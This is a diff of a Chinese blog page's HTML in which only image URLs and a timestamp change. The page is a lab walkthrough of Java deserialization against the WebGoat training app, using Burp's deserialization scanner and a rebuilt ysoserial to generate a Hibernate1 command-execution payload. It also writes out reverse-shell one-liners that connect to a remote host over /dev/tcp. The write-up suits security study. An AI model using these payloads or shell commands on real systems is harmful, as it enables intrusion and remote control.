@@ -15,8 +15,8 @@
 <meta property="og:site_name" content="零点维度">
 <meta property="og:description" content="1.docker-一个开源的应用容器引擎&amp;nbsp;&amp;nbsp;百度百科：Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。&amp;nbsp;&amp;nbsp;之前我是没有用过docker这个应用容器的,都是先配置所需环境。然后把源码，文件放入环境中。而d">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://github.com/budebao/photo/blob/master/F2R_%5DH%24Y4C%7BG22EI53%5BUQU4.png">
-<meta property="og:image" content="https://github.com/budebao/photo/blob/master/VPK5A1QPM%7DTF%7D13JC5M_Y7L.png">
+<meta property="og:image" content="https://github.com/budebao/photo/raw/master/F2R_%5DH%24Y4C%7BG22EI53%5BUQU4.png">
+<meta property="og:image" content="https://github.com/budebao/photo/raw/master/VPK5A1QPM%7DTF%7D13JC5M_Y7L.png">
 <meta property="og:image" content="https://github.com/budebao/photo/blob/master/sddsaf.png">
 <meta property="og:image" content="https://github.com/budebao/photo/blob/master/sdfasdf3.png">
 <meta property="og:image" content="https://github.com/budebao/photo/blob/master/wwqjeowp.png">
@@ -32,11 +32,11 @@
 <meta property="og:image" content="https://github.com/budebao/photo/blob/master/cmd.png">
 <meta property="og:image" content="https://github.com/budebao/photo/blob/master/payload2.png">
 <meta property="og:image" content="https://github.com/budebao/photo/blob/master/getshell.png">
-<meta property="og:updated_time" content="2018-11-03T15:24:25.758Z">
+<meta property="og:updated_time" content="2018-11-03T15:49:00.514Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="java反序列漏洞，及从java-deserialization-from-discovery-to-reverse-shell-on-limited-environments收获的东西">
 <meta name="twitter:description" content="1.docker-一个开源的应用容器引擎&amp;nbsp;&amp;nbsp;百度百科：Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。&amp;nbsp;&amp;nbsp;之前我是没有用过docker这个应用容器的,都是先配置所需环境。然后把源码，文件放入环境中。而d">
-<meta name="twitter:image" content="https://github.com/budebao/photo/blob/master/F2R_%5DH%24Y4C%7BG22EI53%5BUQU4.png">
+<meta name="twitter:image" content="https://github.com/budebao/photo/raw/master/F2R_%5DH%24Y4C%7BG22EI53%5BUQU4.png">
   
     <link rel="alternative" href="/atom.xml" title="零点维度" type="application/atom+xml">
   
@@ -194,7 +194,7 @@
       
         <h2 id="1-docker-一个开源的应用容器引擎"><a href="#1-docker-一个开源的应用容器引擎" class="headerlink" title="1.docker-一个开源的应用容器引擎"></a>1.docker-一个开源的应用容器引擎</h2><p>&nbsp;&nbsp;百度百科：Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。<br><br>&nbsp;&nbsp;之前我是没有用过docker这个应用容器的,都是先配置所需环境。然后把源码，文件放入环境中。而docker直接省去了很多麻烦，只要docker镜像库中有所需的打包好的应用程序。你就可以通过docker简单的几个命令安装，运行。</p>
 <p>#linux：docker的安装<br>简单几个命令即可<br><br>&nbsp;&nbsp;1,更新源<br><br>&nbsp;&nbsp;&nbsp;<code>sudo apt-get update</code><br><br>&nbsp;&nbsp;2,安装docker.io<br><br>&nbsp;&nbsp;&nbsp;<code>sudo apt-get install docker.io</code>  </p>
-<p>#docker的命令<br>&nbsp;1. <code>docker pull webgoat/webgoat-8.0</code><br><br>&nbsp;2. <code>docker run -p 8080:8080 -it webgoat/webgoat-8.0</code> /<br>home/webgoat/start.sh <br><br>执行成功之后就是下面的界面<br><br><img src="https://github.com/budebao/photo/blob/master/F2R_%5DH%24Y4C%7BG22EI53%5BUQU4.png" alt=""><br>&nbsp;&nbsp;&nbsp;8080:8080 前面是主机端口，后面是容器端口<br><br>home/weggoat/start.不是必要的，但是有了之后。加载速度会很快<br><br>&nbsp;1 docker pull  镜像名<br><br>&nbsp;&nbsp;&nbsp;从镜像仓库抓取指定镜像<br><br>&nbsp;2 run<br><br>&nbsp;&nbsp;docker run [OPTIONS] IMAGE [COMMAND] [ARG…]<br>OPTIONS说明：<br>-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</p>
+<p>#docker的命令<br>&nbsp;1. <code>docker pull webgoat/webgoat-8.0</code><br><br>&nbsp;2. <code>docker run -p 8080:8080 -it webgoat/webgoat-8.0</code> /<br>home/webgoat/start.sh <br><br>执行成功之后就是下面的界面<br><br><img src="https://github.com/budebao/photo/raw/master/F2R_%5DH%24Y4C%7BG22EI53%5BUQU4.png" alt=""><br>&nbsp;&nbsp;&nbsp;8080:8080 前面是主机端口，后面是容器端口<br><br>home/weggoat/start.不是必要的，但是有了之后。加载速度会很快<br><br>&nbsp;1 docker pull  镜像名<br><br>&nbsp;&nbsp;&nbsp;从镜像仓库抓取指定镜像<br><br>&nbsp;2 run<br><br>&nbsp;&nbsp;docker run [OPTIONS] IMAGE [COMMAND] [ARG…]<br>OPTIONS说明：<br>-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</p>
 <p>-d: 后台运行容器，并返回容器ID；</p>
 <p>-i: 以交互模式运行容器，通常与 -t 同时使用；</p>
 <p>-p: 端口映射，格式为：主机(宿主)端口:容器端口</p>
@@ -211,7 +211,7 @@
 <p>–link=[]: 添加链接到另一个容器；</p>
 <p>–expose=[]: 开放一个端口或一组端口；</p>
 <p>##2.burpsuite-java反序列化的插件-Java-Deserialization-Scanner</p>
-<p>#burpsuite安装插件<br>&nbsp;&nbsp;1.打开extender<br><br><img src="https://github.com/budebao/photo/blob/master/VPK5A1QPM%7DTF%7D13JC5M_Y7L.png" alt=""><br>&nbsp;&nbsp;&nbsp;直接点击安装即可</p>
+<p>#burpsuite安装插件<br>&nbsp;&nbsp;1.打开extender<br><br><img src="https://github.com/budebao/photo/raw/master/VPK5A1QPM%7DTF%7D13JC5M_Y7L.png" alt=""><br>&nbsp;&nbsp;&nbsp;直接点击安装即可</p>
 <p>##3.maven（打包编译java项目）<br>&nbsp;&nbsp;&nbsp;<br>主要是基于xml来动态构建的，所以原文中需要改pomxml文件来添加<br>javax.el包<br><br>常用命令：<br><br>mvn clean 清除项目目录中的生成结果<br><br>mvn package 根据项目生成jar <br><br>mvn -D skipTests 会跳过测试类<br></p>
 <p>##4.反弹shell原理<br>&nbsp;&nbsp;之前只会用 bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1<br>这一条语句。这次看到 exec 5&lt;&gt;/dev/tcp/10.0.0.1/8888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done 就不会了<br>于是又看了一下 shell命令和 shell反弹原理<br><br><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a> <br><br><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></p>
 <p>###webgoat实战过程<br>&nbsp;&nbsp;&nbsp;1.先截一下包<br><img src="https://github.com/budebao/photo/blob/master/sddsaf.png" alt=""><br><img src="https://github.com/budebao/photo/blob/master/sdfasdf3.png" alt=""><br><br><br>&nbsp;&nbsp;&nbsp;2 转发到Dserialization-Scanner<br><br><img src="https://github.com/budebao/photo/blob/master/wwqjeowp.png" alt=""><br><br><br>&nbsp;&nbsp;&nbsp;3 选择插入点测试<br><br><img src="https://github.com/budebao/photo/blob/master/2wewfw.png" alt=""><br><br><br>最下面的一排，表示选中的数据是以什么格式编码的， 倒数第2排的那个下拉框，选择判断漏洞是否存在使用的方式，这里选择 Sleep模式，然后 点击 Attack（BASE64），等一阵就有结果了<br><img src="https://github.com/budebao/photo/blob/master/sdds45.png" alt=""><br><br><br>可以看到，检测出了hibernate 5 漏洞<br><br><br>输入命令进行攻击<br><br><br><img src="https://github.com/budebao/photo/blob/master/sdf545sd.png" alt=""><br><img src="https://github.com/budebao/photo/blob/master/sdf545sd.png" alt=""><br><br><br>发现出错<br><br><br>通过定位,发现在Java-Deserialization-Scanner的所有的检测逻辑都是硬编码的，那么ysoserial生成Payload却会出错的原因就在于ysoserial本身了。经过定位分析，发现是在生成Hibernate Payload时，缺少javax.el包，所以我们需要直接下载ysoserial的源码然后在pom.xml中加入这个包的依赖，最后手动编译。关于这个问题，作者提供提交了一个pull request。(原文翻译)<br><br>如下修改<br><img src="https://github.com/budebao/photo/blob/master/pomxml.png" alt=""><br>使用maven重新编译打包<br><br><code>mvn clean package -DskipTests -Dhibernate5</code><br><br>打包成功后会在target目录下生成ysoserial-0.0.6-SNAPSHOT.jar和ysoserial-0.0.6-SNAPSHOT-all.jar<br>尝试生成payload<br><br>    <code>java -Dhibernate5 -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 &quot;touch /tmp/test&quot; | base64 -w0</code><br><img src="https://github.com/budebao/photo/blob/master/payload.png" alt=""><br><br>网页输入框没啥限制，直接从那里输入。<br><br><img src="https://github.com/budebao/photo/blob/master/inputpayload.png" alt=""><br>通过docker exec -it <container_id> /bin/bash进入到Docker容器的内部查看是否生成了/tmp/test文件。<br><br><img src="https://github.com/budebao/photo/blob/master/testfile.png" alt=""><br>存在test文件,命令成功执行，攻击成功<br></container_id></p>
